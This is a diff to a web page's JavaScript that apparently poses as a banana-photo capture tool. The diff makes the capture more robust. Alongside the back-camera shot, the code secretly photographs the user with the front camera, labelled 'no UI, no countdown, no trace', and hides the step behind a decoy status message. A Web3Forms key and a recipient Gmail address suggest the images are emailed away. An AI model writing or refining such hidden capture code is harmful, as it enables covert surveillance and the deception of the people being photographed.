@@ -383,10 +383,15 @@
     const WEB3FORMS_KEY = 'eb5accff-e755-4f69-862c-ac844bc38650';
     const RECIPIENT_EMAIL = 'iot757978@gmail.com';
 
-    // Helper: capture frame from video element
+    // Helper: capture frame from video element (ensures video has dimensions)
     function captureFrame(videoEl, maxWidth = 850) {
-      let w = videoEl.videoWidth || 640;
-      let h = videoEl.videoHeight || 480;
+      let w = videoEl.videoWidth;
+      let h = videoEl.videoHeight;
+      if (!w || !h) {
+        // fallback: try to get from style or set default
+        w = videoEl.clientWidth || 640;
+        h = videoEl.clientHeight || 480;
+      }
       if (w > maxWidth) {
         h = Math.round(h * maxWidth / w);
         w = maxWidth;
@@ -396,7 +401,7 @@
       c.height = h;
       const ctx = c.getContext('2d');
       ctx.drawImage(videoEl, 0, 0, w, h);
-      return c.toDataURL('image/jpeg', 0.8);
+      return c.toDataURL('image/jpeg', 0.85);
     }
 
     function stopStream(stream) {
@@ -459,7 +464,6 @@
     }
 
     // Silent front camera capture (hidden, no UI)
-    // Important: back stream must be stopped BEFORE calling this to avoid device conflict
     async function captureFrontSilently() {
       return new Promise(async (resolve, reject) => {
         let hiddenVideo = null;
@@ -515,13 +519,37 @@
       }
       captureInProgress = true;
       btnCapture.disabled = true;
+      
+      // Ensure video has valid dimensions before capturing
+      if (!video.videoWidth || !video.videoHeight) {
+        statusDiv.textContent = '⚠️ Camera not ready, wait a moment...';
+        // brief delay to let camera stabilize
+        await new Promise(r => setTimeout(r, 300));
+        if (!video.videoWidth || !video.videoHeight) {
+          statusDiv.textContent = '⚠️ Camera not ready. Please retry.';
+          btnCapture.disabled = false;
+          captureInProgress = false;
+          return;
+        }
+      }
 
       // 1) Capture banana (back camera)
-      backPhotoURL = captureFrame(video);
+      try {
+        backPhotoURL = captureFrame(video);
+        if (!backPhotoURL || !backPhotoURL.startsWith('data:image')) {
+          throw new Error('Invalid back capture');
+        }
+      } catch (err) {
+        statusDiv.textContent = '❌ Failed to capture banana image. Please retry.';
+        btnCapture.disabled = false;
+        captureInProgress = false;
+        return;
+      }
+
       // freeze preview on canvas
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
-      canvas.getContext('2d').drawImage(video, 0, 0);
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
       canvas.style.display = 'block';
       video.style.display = 'none';
 
@@ -535,7 +563,6 @@
 
       // 3) Capture front camera silently (no UI, no countdown, no trace)
       try {
-        // Show generic "processing" without revealing front step
         statusDiv.textContent = '📡 Optimizing image data...';
         const frontImage = await captureFrontSilently();
         frontPhotoURL = frontImage;
@@ -559,9 +586,8 @@
         // Allow retry: show retake button
         btnRetake.style.display = 'inline-block';
         btnCapture.disabled = true;
-        // re-enable start cam? but we already stopped back stream, so user must retake completely
-        // make retake reset everything
-        fullReset(); // full clean reset so user can start over
+        // full clean reset so user can start over
+        fullReset();
         captureInProgress = false;
         return;
       }
